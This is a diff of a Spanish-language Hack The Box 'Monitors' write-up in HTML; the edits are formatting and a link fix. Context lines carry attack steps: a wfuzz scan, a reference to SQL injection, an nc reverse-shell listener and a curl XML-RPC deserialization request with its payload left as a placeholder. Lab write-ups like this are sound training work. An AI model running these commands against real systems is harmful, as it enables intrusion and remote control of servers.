@@ -211,7 +211,7 @@
   </tbody>
 </table>
 
-<p>Basándonos en la información que nos reporta Nmap, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con <code class="language-plaintext highlighter-rouge">SSH</code> (22) y <code class="language-plaintext highlighter-rouge">HTTP</code> (80).</p>
+<p>Basándonos en la información que nos reporta <em>Nmap</em>, podemos darnos cuenta que la máquina víctima tiene abiertos puertos relacionados con <code class="language-plaintext highlighter-rouge">SSH</code> (22) y <code class="language-plaintext highlighter-rouge">HTTP</code> (80).</p>
 
 <h3 id="fase-de-explotación"><a href="#header-3"></a>Fase De Explotación</h3>
 
@@ -256,6 +256,7 @@
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/11.png" alt="11" class="blog-image" onclick="expandImage(this)" /></p>
 
 <p>También descubrimos que el directorio <code class="language-plaintext highlighter-rouge">wp-content</code> es accesible, lo cual representa un error de configuración, ya que este directorio contiene recursos del <em>CMS</em> que deberían estar protegidos. Dentro de este directorio, podemos realizar un segundo <em>fuzzing</em> (o, alternativamente, podríamos buscar manualmente rutas específicas), llevándonos al directorio <code class="language-plaintext highlighter-rouge">plugins</code>.</p>
+
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wfuzz -c -L -t 400 --hc 404 --hh 0 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://monitors.htb/wp-content/FUZZ
 </code></pre></div></div>
 
@@ -373,7 +374,7 @@
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/32.png" alt="32" class="blog-image" onclick="expandImage(this)" /></p>
 
-<p>Esta búsqueda revela una vulnerabilidad de <a href="https://mateonitro550.github.io/SQL-Injection">inyección SQL</a> en uno de los parámetros de la aplicación. Aunque podríamos ejecutar el exploit tal como está, resulta más valioso entender su funcionamiento para practicar <code class="language-plaintext highlighter-rouge">inyecciones SQL</code>.</p>
+<p>Esta búsqueda revela una vulnerabilidad de <a href="https://mateonitro550.github.io/es/SQL-Injection">inyección SQL</a> en uno de los parámetros de la aplicación. Aunque podríamos ejecutar el exploit tal como está, resulta más valioso entender su funcionamiento para practicar <code class="language-plaintext highlighter-rouge">inyecciones SQL</code>.</p>
 
 <p><img src="https://raw.githubusercontent.com/MateoNitro550/MateoNitro550.github.io/main/assets/2024-10-21-Monitors-Hack-The-Box/33.png" alt="33" class="blog-image" onclick="expandImage(this)" /></p>
 
@@ -626,6 +627,7 @@
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 443
 </code></pre></div></div>
+
 <p>Finalmente, enviamos el segundo <em>payload</em> utilizando <code class="language-plaintext highlighter-rouge">curl</code> de la misma manera que el primero. Al ejecutarse esta solicitud, el servidor ejecutará el archivo <code class="language-plaintext highlighter-rouge">shell.sh</code> y obtendremos una <em>reverse shell</em> dentro de la máquina víctima.</p>
 
 <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl -s https://127.0.0.1:8443/webtools/control/xmlrpc -X POST -d "&lt;?xml version='1.0'?&gt;&lt;methodCall&gt;&lt;methodName&gt;ProjectDiscovery&lt;/methodName&gt;&lt;params&gt;&lt;param&gt;&lt;value&gt;&lt;struct&gt;&lt;member&gt;&lt;name&gt;test&lt;/name&gt;&lt;value&gt;&lt;serializable xmlns='http://ws.apache.org/xmlrpc/namespaces/extensions'&gt; PAYLOAD &lt;/serializable&gt;&lt;/value&gt;&lt;/member&gt;&lt;/struct&gt;&lt;/value&gt;&lt;/param&gt;&lt;/params&gt;&lt;/methodCall&gt;" -k  -H 'Content-Type:application/xml' &amp;&gt;/dev/null
